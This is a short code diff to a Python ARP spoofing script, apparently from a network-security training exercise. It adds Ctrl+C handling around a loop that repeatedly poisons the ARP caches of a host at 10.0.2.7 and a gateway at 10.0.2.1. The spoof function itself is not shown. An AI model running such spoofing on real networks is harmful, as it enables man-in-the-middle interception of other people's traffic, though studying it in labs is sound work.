@@ -24,10 +24,14 @@ def spoof(target_ip, spoof_ip):
 
 sent_packets_count = 0 # Initialize a counter for the number of packets sent
 
-while True:
-    spoof("10.0.2.7", "10.0.2.1")
-    spoof("10.0.2.1", "10.0.2.7")
-    sent_packets_count += 2 # Increment the packet count by 2 for each iteration
-    print("\r[+] Sent packets: " + str(sent_packets_count), end="")  # Print the number of packets sent
-    time.sleep(2) # Wait for 2 seconds before sending the next packet
-# This script creates an ARP spoofing packet.
+try:
+    while True:
+        spoof("10.0.2.7", "10.0.2.1")
+        spoof("10.0.2.1", "10.0.2.7")
+        sent_packets_count += 2 # Increment the packet count by 2 for each iteration
+        print("\r[+] Sent packets: " + str(sent_packets_count), end="")  # Print the number of packets sent
+        time.sleep(2) # Wait for 2 seconds before sending the next packet
+    # This script creates an ARP spoofing packet.
+except KeyboardInterrupt:
+    print("\n[+] Detected CTRL + C ... Quitting.")
+   
